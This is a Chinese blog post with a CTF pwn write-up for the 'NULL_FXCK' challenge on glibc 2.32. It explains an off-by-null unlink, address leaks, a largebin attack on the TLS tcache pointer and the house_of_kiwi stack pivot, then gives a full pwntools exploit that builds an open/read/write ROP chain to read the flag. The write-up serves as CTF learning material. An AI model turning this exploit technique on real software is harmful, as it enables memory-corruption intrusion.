+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194908326-132930920.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>edit函数存在off_by_null漏洞，但是只能使用一次</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910194842502-1275553514.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>show函数存在截断</strong></p>
+<p><strong>free函数没有UAF漏洞</strong></p>
+<p><strong>分析：只有一个off_by_null漏洞，只能使用一次，那么可以通过unlink实现堆块重叠，达到泄露地址的目的，但是本题libc是2.32的libc，还是存在_malloc_hook这些钩子，但是这些被ban掉了，而且开了沙箱保护，我们只能orw读取flag，那么就可以从上面house_of_kiwi下手。首先要做的是unlink，但是这样就需要伪造fd指针和bk指针，以前我们一般是将fd和bk指针指向自身来绕过unlink检查，但是现在我们不能泄露地址，也就是要在无法泄露地址的情况下完成unlink</strong></p>
+<p><strong>那么我们可以申请6个堆块，free 0，3，5堆块，那么堆块3的fd和bk就已经确定了，此时想要达到堆块重叠，可以把chunk3的size改大（改到top_chunk这样下次在top_chunk申请堆块时候，free时候，会向上合并），怎么来呢，free掉chunk2，然后chunk2和chunk3会合并，然后申请堆块修改chunk3的size，那么此时，链表就被破坏了</strong></p>
+<p><strong>free 0，3，5</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202520917-1426703431.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>chunk2和chunk3合并</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202555232-2002728228.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>chunk3size被修改，同时它的fd和bk指针已经设置好了</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202629686-588878874.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>此时，剩下两个chunk加入到了largebin中，我们申请出来，但是怎么修改它们的fd和bk指针呢</strong></p>
+<p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202658837-1880588532.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>注意看刚刚chunk3和chunk2合并之后剩下的chunk（称为left_chunk），它的地址只有最低位和chunk3不一样，而且chunk3的地址末位是0，这个是一开始布局的时候这样布置的，因为add有截断，我们可以通过free这个left_chunk和chunk0以前和chunk5来构成链子，最后通过add截断修改掉fd或者bk指针</strong></p>
+<p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910202923078-1143309769.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>这里以chunk0为例子，注意他的fd是chunk3+0x20的位置，那么如果截断一下就是chunk3了</strong></p>
+<p><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910203743142-1403970523.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>同理chunk5也是一样，那么完成这个再伪造一下prev_size即可完成unlink，即可申请堆块达到堆块重叠，泄露地址，但是存在00截断，还需要加入到largebin中泄露libc地址以及heap地址</strong></p>
+<p><strong>那么现在泄露地址的问题解决了，还需要实现任意地址写，那么这里涉及一个知识，我们知道管理tcachebin链表是一个结构体在heap起始处</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204311146-480753226.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>其实这个在tls里面有一个指针指向它只是被映射成了这个地址，我们可以找一下</strong></p>
+<p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204526845-1874284413.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>那么通过largebin 劫持这个地址即可劫持到tcachebin链表实现任意地址写，接下来就是house_of_kiwi，实现栈迁移，提前把orw链子写入到chunk里面</strong></p>
+<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a><strong>EXP：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gt <span class="hljs-keyword">import</span> *<br><br>con(<span class="hljs-string">&quot;amd64&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.32.so&quot;</span>)<br><br>io = process(<span class="hljs-string">&quot;./NULL_FXCK&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,msg=<span class="hljs-string">&#x27;\x00&#x27;</span></span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;(: Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&quot;(: Content: &quot;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    io.sendafter(<span class="hljs-string">&quot;Content: &quot;</span>,msg)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x1f8</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x438</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#6</span><br><br><br>free(<span class="hljs-number">0</span>)   <br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>gdb.attach(io)<br>free(<span class="hljs-number">2</span>) <span class="hljs-comment">#chunk3 chunk2 he bing</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x428</span> + p64(<span class="hljs-number">0xc91</span>)<br>add(<span class="hljs-number">0x440</span>,payload) <span class="hljs-comment">#0</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#2 chunk3 chunk2 leave part</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#3  yuanxian chunk0</span><br>add(<span class="hljs-number">0x428</span>) <span class="hljs-comment">#5 yuanxian chunk5</span><br><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">9</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#3</span><br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">0x9f8</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0x428</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#5</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x200</span> + p64(<span class="hljs-number">0xc90</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span><br>edit(<span class="hljs-number">6</span>,payload)<br><span class="hljs-comment">#gdb.attach(io)</span><br>add(<span class="hljs-number">0x418</span>)<br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment"># fangzhi top_chunk</span><br><br>free(<span class="hljs-number">3</span>)<br>payload = p64(<span class="hljs-number">0</span>) *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x421</span>)<br>add(<span class="hljs-number">0x430</span>,payload)<br>add(<span class="hljs-number">0x1600</span>)<br>show(<span class="hljs-number">4</span>)<br>libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) -<span class="hljs-number">0x6a0</span> -libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>suc(<span class="hljs-string">&quot;libc_base&quot;</span>,libc_base)<br><br>show(<span class="hljs-number">5</span>)<br>heap_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2b0</span><br>suc(<span class="hljs-string">&quot;heap_base&quot;</span>,heap_base)<br><span class="hljs-comment">#gdb.attach(io)</span><br>tls_truct = libc_base + <span class="hljs-number">0x1eb578</span><br>suc(<span class="hljs-string">&quot;tls_truct&quot;</span>,tls_truct)<br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br>setcontext  = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>]<br>pop_rdi = libc_base + <span class="hljs-number">0x000000000002858f</span><span class="hljs-comment">#: pop rdi; ret; </span><br>pop_rsi = libc_base + <span class="hljs-number">0x000000000002ac3f</span><span class="hljs-comment">#: pop rsi; ret;</span><br>pop_rdx_r12 = libc_base + <span class="hljs-number">0x0000000000114161</span><span class="hljs-comment">#: pop rdx; pop r12; ret;</span><br>IO_file_jumps = libc_base + <span class="hljs-number">0x1e54c0</span><br>IO_hleper_jumps = libc_base + <span class="hljs-number">0x1e48c0</span><br>suc(<span class="hljs-string">&quot;IO_hleper_jumps&quot;</span>,IO_hleper_jumps)<br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span> <span class="hljs-comment">#: ret; </span><br><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x428</span> + p64(<span class="hljs-number">0x211</span>) + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0xa01</span>)<br>add(<span class="hljs-number">0x1240</span>,payload)<br><br>free(<span class="hljs-number">0</span>) <span class="hljs-comment"># orw_addr</span><br>flag_addr = heap_base + <span class="hljs-number">0x8e0</span> + <span class="hljs-number">0x100</span><br>orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x40</span>)*<span class="hljs-number">2</span> + p64(read)<br>orw += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr + <span class="hljs-number">0x100</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">0x40</span>)*<span class="hljs-number">2</span> + p64(write)<br>orw = orw.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>orw += <span class="hljs-string">b&#x27;flag\x00\x00\x00\x00&#x27;</span><br><br>add(<span class="hljs-number">0x440</span>,orw) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x418</span>) <span class="hljs-comment">#11</span><br>add(<span class="hljs-number">0x208</span>) <span class="hljs-comment">#12</span><br><br>free(<span class="hljs-number">5</span>) <span class="hljs-comment">#unlink big  chunk</span><br>free(<span class="hljs-number">4</span>) <span class="hljs-comment"># large_bin attack chunk </span><br><span class="hljs-comment"># chunk5 ----&gt; largebin</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + p64(libc_base + <span class="hljs-number">0x1e3ff0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x1350</span>)<br>payload += p64(tls_truct - <span class="hljs-number">0x20</span>)<br><br>add(<span class="hljs-number">0x1240</span>,payload)<br>free(<span class="hljs-number">11</span>)<br>add(<span class="hljs-number">0x500</span>) <span class="hljs-comment"># wancheng large_bin attack</span><br><br>add(<span class="hljs-number">0x410</span>) <span class="hljs-comment">#11</span><br>free(<span class="hljs-number">4</span>)<br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x208</span> + p64(<span class="hljs-number">0x431</span>) + p64(libc_base + <span class="hljs-number">0x1e3ff0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x1350</span>)*<span class="hljs-number">2</span><br>add(<span class="hljs-number">0x1240</span>,payload)<br><br>fake_tcache = <span class="hljs-string">b&#x27;\x07\x00&#x27;</span> * <span class="hljs-number">0x35</span><br>fake_tcache = fake_tcache.ljust(<span class="hljs-number">0xe8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(IO_file_jumps + <span class="hljs-number">0x60</span>)<br>fake_tcache = fake_tcache.ljust(<span class="hljs-number">0x168</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(IO_hleper_jumps + <span class="hljs-number">0xa0</span>)<br>fake_tcache +=  p64(heap_base + <span class="hljs-number">0x46f0</span>) <span class="hljs-comment">#top_chunk</span><br>add(<span class="hljs-number">0x420</span>,fake_tcache)<br>add(<span class="hljs-number">0x100</span>,p64(setcontext+<span class="hljs-number">61</span>))<br>add(<span class="hljs-number">0x200</span>,p64(heap_base + <span class="hljs-number">0x8e0</span>)+p64(ret))<br>add(<span class="hljs-number">0x210</span>,p64(<span class="hljs-number">0x999</span>))<br>gdb.attach(io)<br>add(<span class="hljs-number">0x1000</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h3 id="最后效果"><a href="#最后效果" class="headerlink" title="最后效果"></a><strong>最后效果</strong></h3><p><strong><img src="/2024/09/10/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-kiwi/3419447-20240910204909438-688353297.png" srcset="/img/loading.gif" lazyload alt="img"></strong></p>
+<p><strong>The best way to predict the future is to create it.</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/PWN/" class="print-no-link">#PWN</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>常回家看看之house_of_kiwi</div>
+      <div>https://ch13hh.github.io/2024/09/10/常回家看看之house-of-kiwi/</div>
+    </div>
+    <div class="license-meta">
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月10日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/13/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Bhouse-of-emma/" title="常回家看看之house_of_emma">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">常回家看看之house_of_emma</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/14/NSS%E5%B0%8F%E8%AE%B01/" title="NSS小记1">
+                        <span class="hidden-mobile">NSS小记1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"AWdKxtM41CcPxu2EZoBdWpas-gzGzoHsz","appKey":"idRJngxDPrsuLA4G1dKyEewP","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
